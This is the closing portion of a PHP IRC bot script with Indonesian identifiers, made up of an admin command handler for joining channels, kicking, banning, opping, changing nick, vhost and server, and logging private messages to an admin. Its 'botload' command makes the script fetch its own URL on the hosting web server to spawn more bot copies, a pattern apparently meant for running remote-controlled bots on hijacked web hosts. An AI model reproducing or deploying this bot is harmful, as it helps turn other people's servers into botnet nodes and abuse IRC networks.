                   $msg = '';
                 }
                 fputs($fp, 'PART '.$partchan.' :'.$msg . CRL);
                 $remchan = strtolower($partchan);
                 if (in_array($remchan, $channel)) {
                   $channels = str_replace("$remchan ","",$channels);
                   unset($channel);
                   $channel = explode(" ", $channels);
                 }
                 foreach ($channel as $v) {
                   fputs($fp, 'JOIN '.$v . CRL);
                 }
               }
               elseif ($com[3]==':`join' && $com[4] && $auth["$dNick"]["status"]=="Admin") {
                 if (!ereg("#",$com[4])) { $com[4]="#".$com[4]; }
                 $addchan = strtolower($com[4]);
                 if (!in_array($addchan, $channel)) {
                   $channel[]=$addchan;
                   $channels.="$addchan ";
                 }
                 foreach ($channel as $v) {
                   sleep(rand(1,6));
                   fputs($fp, 'JOIN '.$v . CRL);
                 }
               }
               elseif ($com[3]==':`botnick' && $com[4] && !$chan && $auth["$dNick"]["status"]=="Admin") {
                 $nick = $com[4];
                 $identify = $com[5];
                 fputs($fp, 'NICK '.$nick . CRL);
                 fputs($fp, 'PRIVMSG nickserv :identify '.$nick.' '.$identify.  CRL);
               }
               elseif ($com[3]==':`k' && $com[4] && $chan) {
                 $msg = strstr($data,":`k");
                 $msg = str_replace(":`k $com[4]","",$msg);
                 fputs($fp, 'KICK '.$chan.' '.$com[4].' :'.$msg . CRL);
               }
               elseif ($com[3]==':`kb' && $com[4] && $chan) {
                 $msg = strstr($data,":`kb");
                 $msg = str_replace(":`kb $com[4]","",$msg);
                 fputs($fp, 'KICK '.$chan.' '.$com[4].' :'.$msg . CRL);
                 fputs($fp, 'MODE '.$chan.' +b '.$com[4] . CRL);
               }
               elseif ($com[3]==':`botnick') {
                 $nick = $nicky[rand(0,count($nicky) - 1)];
                 fputs($fp, 'NICK '.$nick . CRL);
                 if (substr($dCommand,0,3)=='433') {
                   $nick = $nicky[rand(0,count($nicky) - 1)];
                   fputs($fp, 'NICK '.$nick . CRL);
                 }
               }
               elseif ($com[3]==':`op' && $chan) {
                 if ($com[4]) { $opnick = $com[4]; }
                 else { $opnick = $dNick; }
                 fputs($fp, 'MODE '.$chan.' +ooo '.$opnick.' '.$com[5].' '.$com[6] . CRL);
               }
               elseif ($com[3]==':`deop' && $chan) {
                 if ($com[4]) { $opnick = $com[4]; }
                 else { $opnick = $dNick; }
                 fputs($fp, 'MODE '.$chan.' -o+v-oo '.$opnick.' '.$opnick.' '.$com[5].' '.$com[6] . CRL);
               }
               elseif ($com[3]==':`v' && $chan) {
                 if ($com[4]) { $vonick = $com[4]; }
                 else { $vonick = $dNick; }
                 fputs($fp, 'MODE '.$chan.' +vvv '.$vonick.' '.$com[5].' '.$com[6] . CRL);
               }
               elseif ($com[3]==':`dv' && $chan) {
                 if ($com[4]) { $vonick = $com[4]; }
                 else { $vonick = $dNick; }
                 fputs($fp, 'MODE '.$chan.' -vvv '.$vonick.' '.$com[5].' '.$com[6] . CRL);
               }
               elseif ($com[3]==':`awaymsg' && $auth["$dNick"]["status"]=="Admin") {
                 $msg = strstr($data,":`awaymsg");
                 $msg = str_replace(":`awaymsg","",$msg);
                 if (strlen($msg)<3) {
                   $raway="on";
                   fputs($fp,'AWAY : ' . 'AWAY' . CRL);
                 }
                 else {
                   $raway="off";
                   fputs($fp,'AWAY : ' . $msg . CRL);
                 }
               }
               elseif ($com[3]==':`mode' && $com[4] && $chan) {
                 fputs($fp, 'MODE '.$chan.' :'.$com[4].' '.$com[5] . CRL);
               }
               elseif ($com[3]==':`nickmode' && $com[4]) {
                 $nickmode = $com[4];
                 fputs($fp, 'MODE '.$nick.' :'.$nickmode . CRL);
               }
               elseif ($com[3]==':`chanlist') {
                 fputs($fp, 'NOTICE '.$dNick.' :Channel List: '.$channels . CRL);
               }
               elseif ($com[3]==':`userlist') {
                 $userlist="";
                 foreach ($auth as $user) {
                   if ($user["pass"]) { $pass="-pass ok"; }
                   else { $pass="-no pass"; }
                   $userlist .= $user["name"].'('.$user["status"].$pass.') ';
                 }
                 fputs($fp, 'NOTICE '.$dNick.' :User List: '.$userlist . CRL);
               }
               elseif ($com[3]==':`quit' && $auth["$dNick"]["status"]=="Admin") {
                 $msg = strstr($data,":`quit");
                 $msg = str_replace(":`quit","",$msg);
                 if (strlen($msg)>3) {
                   $msg = str_replace(" ","_",$msg);
                 }
                 $quitmsg = $quitmsglist[rand(0,count($quitmsglist) - 1)];
                 fputs($fp, 'QUIT ' . $quitmsg . CRL);
                 $keluar = 1;
                 exit;
               }
               elseif ($com[3]==':`vhost' && $auth["$dNick"]["status"]=="Admin") {
                 if ($com[4]) { $localhost = $com[4]; }
                 else { $localhost = 'localhost'; }
                 $keluar = 0;
                 fputs($fp, 'QUIT Ganti VHOST' . CRL);
               }
               elseif ($com[3]==':`jump' && $auth["$dNick"]["status"]=="Admin") {
                 if (empty($com[4])) {
                   $remotehost = $remotehost2[rand(0,count($remotehost2) - 1)];
                 }
                 else { $remotehost = $com[4]; }
                 $keluar = 0;
                 fputs($fp, "QUIT Ganti Server".CRL);
               }
               elseif ($com[3]==':`ident' && $auth["$dNick"]["status"]=="Admin") {
                 if (!$com[4]) { $username = $username; }
                 else { $username = $com[4]; }
                 $keluar = 0;
                 fputs($fp, 'QUIT Ganti Ident ' . CRL);
               }
               elseif ($com[3]==':`fullname' && $auth["$dNick"]["status"]=="Admin") {
                 if (!$com[4]) { $realname = "--"; }
                 else { $realname = $com[4]; }
                 $keluar = 0;
                 fputs($fp, 'QUIT Ganti Nama' . CRL);
               }
               elseif ($com[3]==':`topic' && $com[4] && $chan) {
                 $msg = strstr($data,":`topic");
                 $msg = str_replace(":`topic ","",$msg);
                 fputs($fp, 'TOPIC '.$chan.' :'.$msg . CRL);
               }
               elseif ($com[3]==':`botload') {
                 if ($auth["$dNick"]["status"]=="Admin") {
                   $bhost = $_SERVER['HTTP_HOST'];
                   $bruri = $_SERVER['REQUEST_URI'];
                   if ($com[4]) { $jmlbot = $com[4]; }
                   else { $jmlbot = 1; }
                   for ($i=1;$i<=$com[4];$i++) {
                     $soket = fsockopen($bhost,80,$errno,$errstr,10);
                     fputs($soket,"GET $bruri HTTP/1.0\r\nHost: $bhost\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n");
                     fclose($soket);
                   }
                   fputs($fp,"NOTICE $dNick :".$com[4]." Bot(s) loaded!".CRL);
                 }
               }
               elseif ($com[3]==':!help' && !$chan) {
                 fputs($fp,'PRIVMSG '.$dNick.' :No Help!' . CRL);
               }
             }
           }
         }
         elseif (!$auth["$dNick"] && !eregi("auth",$iText)) {
           if (eregi("www.",$iText) || eregi("http:",$iText) || eregi("join #",$iText)) {
             if (!ereg("#",$dCommand)) {
               if ($log=="on") {
                 fputs($fp,'PRIVMSG '. $admin .' :4inviter: ' . $dFrom . '2:' .$iText. CRL);
               }
               $inv = strstr($dFrom,'@');
               foreach ($auth as $user) {
                 if ($user["status"]=="user") {
                   fputs($fp, 'NOTICE '.$user["name"].' :KB '.$chan.' '.$dNick.' '.$inv.'' . CRL);
                 }
               }
             }
           }
           elseif (!ereg("#",$dCommand)) {
             if ($log=="on") {
               fputs($fp,'PRIVMSG '.$admin.' :6' . $dFrom . '12:' .$iText. CRL);
             }
           }
         }
       }
     }
     elseif (substr($data,0,4) == 'PING') {
       fputs($fp,'PONG ' . substr($data,5) . CRL);
     }
   }
 }
 fclose($fp);
} while ($keluar == 0);
}

hajar();

?>



